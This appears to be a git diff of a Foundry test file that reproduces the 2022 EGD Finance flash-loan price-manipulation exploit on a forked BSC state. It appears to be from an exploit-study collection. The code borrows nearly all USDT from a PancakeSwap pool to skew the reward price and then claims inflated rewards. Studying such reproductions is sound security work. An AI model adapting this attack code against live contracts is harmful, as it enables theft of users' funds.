@@ -31,6 +31,7 @@ contract Exploit is Test {
     address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
     address constant egdToken = 0x202b233735bF743FA31abb8f71e641970161bF98;
     address constant attacker = address(0xC30808D9373093fBFCEc9e026457C6a9DaB706a7);
+    address constant statkeInvitor = address(0x659b136c49Da3D9ac48682D02F7BD8806184e218);
 
     function setUp() public {
         // 注意: 必須 fork 攻擊 tx 的前一個 block, 因為此時受害合約狀態尚未改變!!
@@ -46,40 +47,56 @@ contract Exploit is Test {
         vm.label(egdToken, "EGD");
     }
 
-    // function testNormalFlow() public {
-    //     console.log("-------------------------------- Normal ----------------------------------");
-    //     uint256 rewardBalance = IEGD_Finance(EGD_Finance).calculateAll(attacker);
-    //     emit log_named_decimal_uint("Attacker rewardBalance Balance", rewardBalance, 18);
+    function testRegular() public {
+        console.log("-------------------------------- Regular ----------------------------------");
+        uint256 rewardBalance = IEGD_Finance(EGD_Finance).calculateAll(address(this));
+        uint256 EGDBalance = IERC20(egdToken).balanceOf(address(this));
 
-    //     vm.prank(attacker);
-    //     IEGD_Finance(EGD_Finance).claimAllReward();
+        emit log_named_decimal_uint("Pre reward Balance", rewardBalance, 18);
+        emit log_named_decimal_uint("Pre EGDBalance", EGDBalance, 18);
 
-    //     uint256 AttackerEGDBalance = IERC20(egdToken).balanceOf(attacker);
-    //     emit log_named_decimal_uint("Attacker EGDBalance", AttackerEGDBalance, 18);
-    // }
+        IEGD_Finance(EGD_Finance).bond(statkeInvitor);
+        deal(address(usdt), address(this), 100 ether);
+        // Stake 100 USDT
+        IERC20(usdt).approve(EGD_Finance, 100 ether);
+        IEGD_Finance(EGD_Finance).stake(100 ether);
+
+        // stake time stamp 2022-08-07 23:14:52 UTC
+        // stake 1 min
+        // block.timestamp = 2022-08-07 23:15:46(UTC)
+        vm.warp(1659914146);
+
+        rewardBalance = IEGD_Finance(EGD_Finance).calculateAll(address(this));
+        emit log_named_decimal_uint("After reward Balance", rewardBalance, 18);
+
+        IEGD_Finance(EGD_Finance).claimAllReward();
+
+        EGDBalance = IERC20(egdToken).balanceOf(address(this));
+        emit log_named_decimal_uint("EGDBalance", EGDBalance, 18);
+    }
 
     function testExploit() public {
         console.log("-------------------------------- Exploit ----------------------------------");
-        uint256 AttackerUSDTBalance = IERC20(usdt).balanceOf(attacker);
+        uint256 USDTBalance = IERC20(usdt).balanceOf(address(this));
         uint256 EGDPrice = IEGD_Finance(EGD_Finance).getEGDPrice();
         uint256 EGDReward = IEGD_Finance(EGD_Finance).calculateAll(address(this));
 
         // 攻擊前, 先 print 出餘額, 已便於更好的觀察 balance 變化
-        emit log_named_decimal_uint("[Start] Attacker USDT Balance", AttackerUSDTBalance, 18);
-        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", EGDPrice, 18);
-        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", EGDReward, 18);
+        emit log_named_decimal_uint("USDT Balance", USDTBalance, 18);
+        emit log_named_decimal_uint("EGD/USDT Price before", EGDPrice, 18);
+        emit log_named_decimal_uint("Current calculateAll", EGDReward, 18);
 
         stake();
         // block.timestamp = 2022-08-07 23:15:46(UTC)
         vm.warp(1659914146);
-        Harvest();
+        harvest();
 
         // console.log("-------------------------------- End Exploit ----------------------------------");
-        AttackerUSDTBalance = IERC20(usdt).balanceOf(attacker);
-        emit log_named_decimal_uint("[End] Attacker USDT Balance", AttackerUSDTBalance, 18);
+        USDTBalance = IERC20(usdt).balanceOf(address(this));
+        emit log_named_decimal_uint("USDT Balance", USDTBalance, 18);
     }
 
-    function Harvest() public {
+    function harvest() public {
         // borrow 2,000 USDT from USDT/WBNB LPPool reserve
         USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
     }
@@ -88,18 +105,18 @@ contract Exploit is Test {
         // Give exploit contract 100 USDT
         deal(address(usdt), address(this), 100 ether);
         // Set invitor
-        IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
+        IEGD_Finance(EGD_Finance).bond(statkeInvitor);
         // Stake 100 USDT
         IERC20(usdt).approve(EGD_Finance, 100 ether);
         IEGD_Finance(EGD_Finance).stake(100 ether);
     }
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
-        // borrow 2000 usdt
-        emit log_named_decimal_uint("[INFO] Before flashswap, usdt balance:", IERC20(usdt).balanceOf(attacker), 18);
-
         // Flashloan[1]
         if (keccak256(data) == keccak256("0000")) {
+            // borrow 2000 usdt
+            emit log_named_decimal_uint("Before flashswap, usdt balance:", IERC20(usdt).balanceOf(address(this)), 18);
+
             // Attacker borrows 99.99999925% USDT of EGD_USDT_LPPool reserve
             borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000;
             EGD_USDT_LPPool.swap(0, borrow2, address(this), "00");
@@ -124,13 +141,13 @@ contract Exploit is Test {
         } else {
             // Flashloan[2]
             uint256 EGDPrice = IEGD_Finance(EGD_Finance).getEGDPrice();
-            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", EGDPrice, 18);
+            emit log_named_decimal_uint("EGD/USDT Price after", EGDPrice, 18);
 
             // Claim all EGD Token reward from EGD Finance contract
             IEGD_Finance(EGD_Finance).claimAllReward();
 
             uint256 egdTokenBalance = IERC20(egdToken).balanceOf(address(this));
-            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", egdTokenBalance, 18);
+            emit log_named_decimal_uint("Get reward (EGD token)", egdTokenBalance, 18);
 
             // Attacker needs to pay >0.25% fee back to Pancakeswap
             // 424,456,221,210,335,857,574,110 loan
